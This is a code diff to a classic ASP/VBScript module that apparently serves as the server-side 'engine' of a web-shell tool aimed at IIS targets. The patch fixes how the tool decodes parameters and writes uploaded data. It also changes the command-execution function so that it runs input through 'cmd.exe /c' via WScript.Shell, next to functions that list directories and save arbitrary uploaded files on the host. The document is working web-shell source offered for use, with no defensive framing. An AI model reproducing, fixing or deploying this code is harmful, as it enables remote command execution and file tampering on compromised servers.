@@ -8,6 +8,15 @@
 ' Note: this engine is not testable on macOS; it is provided for classic IIS
 ' targets and should be verified on a Windows/IIS host.
 
+Function MxToString(v)
+    Dim i, s
+    s = ""
+    For i = 1 To LenB(v)
+        s = s & Chr(AscB(MidB(v, i, 1)))
+    Next
+    MxToString = s
+End Function
+
 Function MxParams(data)
     Dim dict, i, n, key, b
     Set dict = Server.CreateObject("Scripting.Dictionary")
@@ -23,7 +32,7 @@ Function MxParams(data)
                 + AscB(MidB(data, i + 4, 1)) * 16777216
             i = i + 5
             If n < 0 Or i + n - 1 > LenB(data) Then Exit Do
-            dict(key) = MidB(data, i, n)
+            dict(key) = MxToString(MidB(data, i, n))
             key = ""
             i = i + n
         Else
@@ -114,7 +123,7 @@ Function MxExec(command)
     Dim sh, ex
     On Error Resume Next
     Set sh = Server.CreateObject("WScript.Shell")
-    Set ex = sh.Exec(command)
+    Set ex = sh.Exec("cmd.exe /c " & command)
     If Err.Number <> 0 Then
         Err.Clear
         MxExec = "Exception: " & Err.Description
@@ -144,6 +153,7 @@ Function MxGetFile(dir)
     For Each subFolder In folder.SubFolders
         text = text & subFolder.Name & Chr(9) & "0" & Chr(9) & subFolder.DateLastModified & Chr(9) & "0" & Chr(9) & "RW" & nl
     Next
+    Err.Clear
     MxGetFile = text
 End Function
 
@@ -175,7 +185,7 @@ Function MxUploadFile(path, value)
     Set stream = Server.CreateObject("ADODB.Stream")
     stream.Type = 1
     stream.Open
-    stream.Write value
+    stream.Write MxStringToBinary(value)
     stream.SaveToFile path, 2
     stream.Close
     Set stream = Nothing
@@ -317,12 +327,12 @@ Function MxBigUpload(path, value, position)
     stream.Type = 1
     stream.Open
     If position = "" Then
-        stream.Write value
+        stream.Write MxStringToBinary(value)
         stream.SaveToFile path, 2
     Else
         stream.LoadFromFile path
         stream.Position = CLng(position)
-        stream.Write value
+        stream.Write MxStringToBinary(value)
         stream.SaveToFile path, 2
     End If
     stream.Close
